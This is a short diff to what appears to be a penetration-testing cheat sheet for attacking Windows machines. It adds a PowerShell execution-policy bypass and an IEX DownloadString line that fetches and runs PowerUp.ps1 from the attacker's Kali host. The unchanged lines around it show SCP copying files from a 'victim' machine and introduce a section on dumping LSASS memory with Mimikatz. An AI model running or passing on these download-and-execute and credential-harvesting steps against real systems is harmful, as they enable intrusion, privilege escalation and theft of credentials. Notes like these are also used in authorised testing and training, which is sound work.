@@ -126,6 +126,10 @@ In Windows VIctim Download File:
 Simple SCP from Windows Victim Machine to ATTAK Machine Kali:
     scp FileNAme <Username>@<KALI IP>:/FilePAth/ .
 
+If certutil doesn<t work try with Powershell scitp:
+    powershell -ep bypass
+    IEX(New-Object Net.WebClient).DownloadString("http://<Kali IP: Port>/PowerUp.ps1")
+
 
 ####################
 MIMIKATZ - LSASS DUMP MEMORY (Check: Check: AD -> Credentials Harversting -> Local Security Authority Subsystem Service LSASS.txt)
